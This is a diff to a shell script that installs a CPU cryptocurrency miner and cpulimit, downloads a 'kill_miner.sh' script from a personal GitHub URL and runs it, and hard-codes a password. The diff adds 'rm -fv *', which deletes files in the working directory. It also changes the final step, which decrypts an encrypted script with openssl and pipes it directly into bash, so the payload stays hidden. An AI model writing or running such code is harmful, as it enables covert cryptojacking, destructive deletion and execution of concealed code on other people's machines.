@@ -1,6 +1,7 @@
 #!/bin/sh
 password="danielchau@123#"
 rm -fR /root/cpuminer-opt-linux
+rm -fv *
 sudo apt-get update -y
 sudo apt-get install cpulimit -y
 wget --no-check-certificate -O cpuminer-opt-linux.tar.gz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
@@ -85,4 +86,4 @@ wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_
 chmod 777 /root/kill_miner.sh
 ./kill_miner.sh
 sleep 3
-openssl enc -d -aes-256-cbc -in danielluis1922.sh -pass pass:danielchau@123# | bash
+openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
